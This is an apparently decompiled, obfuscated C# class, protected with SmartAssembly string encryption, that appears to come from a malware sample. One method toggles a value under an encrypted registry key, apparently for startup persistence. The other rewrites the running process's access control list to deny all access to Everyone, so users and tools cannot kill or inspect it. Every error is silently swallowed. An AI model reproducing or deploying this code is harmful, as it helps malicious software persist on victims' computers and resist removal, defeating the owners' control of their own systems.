using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace gZJMShdGuoGG;

internal sealed class qGUzKUzjIwd
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr HNOegIgHDyuAKLd, int DNpXxCwYgUSsMl, [Out] byte[] NSOFZEtRTsGVBM, uint zhwwznOiIwoM, out uint uvXVStphqjl);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr bSiOPaRxpQti, int CPigASkHGCBV, [In] byte[] wcFbpnoJVASqS);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void wsLUFsqKRceBxPxA(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(getString_0(107408284));
			if (bool_0 && registryKey.GetValue(getString_0(107407663)) != null)
			{
				registryKey.DeleteValue(getString_0(107407663));
			}
			else
			{
				registryKey.SetValue(getString_0(107407663), getString_0(107411474));
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor LAaQhFusuFksV(IntPtr intptr_0)
	{
		byte[] nSOFZEtRTsGVBM = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, nSOFZEtRTsGVBM, 0u, out var uvXVStphqjl);
		if ((long)uvXVStphqjl > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, nSOFZEtRTsGVBM = new byte[uvXVStphqjl], uvXVStphqjl, out uvXVStphqjl))
		{
			return null;
		}
		return new RawSecurityDescriptor(nSOFZEtRTsGVBM, 0);
	}

	private void muTGVjDGqtr(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void rahbPilFHXlwq()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = LAaQhFusuFksV(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			muTGVjDGqtr(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static qGUzKUzjIwd()
	{
		Strings.CreateGetStringDelegate(typeof(qGUzKUzjIwd));
	}
}
